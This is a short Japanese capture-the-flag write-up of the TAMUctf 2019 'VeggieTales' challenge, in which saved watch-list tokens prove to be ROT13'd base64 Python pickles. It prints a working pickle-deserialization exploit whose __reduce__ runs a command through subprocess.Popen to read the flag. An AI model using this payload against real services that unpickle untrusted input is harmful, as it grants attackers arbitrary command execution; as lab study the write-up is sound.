# [pwn 489pts] VeggieTales - TAMUctf 19
バイナリは渡されません。

Dockerファイルは[ここ](https://github.com/tamuctf/TAMUctf-2019/tree/master/Pwn/VeggieTales)にあるので試したい方はどうぞ。

アニメのエピソード一覧があって、見るものリストに追加していくことができます。
また、リストをbase64っぽいトークンとして保存することができます。
次に接続した時にこのトークンを入力すればリストが復元されます。

適当な入力を入れた時の耐性からpythonで動いてるっぽいということが分かりました。
また、pythonに対するexploitということで、pickleのdeserializeを利用する攻撃だと考えました。

しかし、トークンをbase64でデコードしても意味の分からないバイナリになってしまいます。
参加時は運営にヒントを求めたところ13という数字が鍵だと教えてくれました。
そこで、base64っぽいトークンをrot13してからbase64デコードするとpickle形式のバイナリが出てきました。

次のスクリプトで生成したbase64をrot13して送ると任意のコマンドが実行できます。

```python
import os
import subprocess
import pickle
import base64

class Test(object):
    def __reduce__(self):
        return (subprocess.Popen, (('cat', 'flag.txt'),))

def serialize_exploit():
    shellcode = pickle.dumps(Test())
    return shellcode

def insecure_deserialize(exploit_code):
    pickle.loads(exploit_code)

if __name__ == '__main__':
    shellcode = serialize_exploit()
    print(shellcode)
    print(base64.b64encode(shellcode)) ### ROT13 this!!!
    insecure_deserialize(shellcode)
```

# 感想
pickleのdeserializeの脆弱性は初めて使いました。
ただrot13はguessingですね。
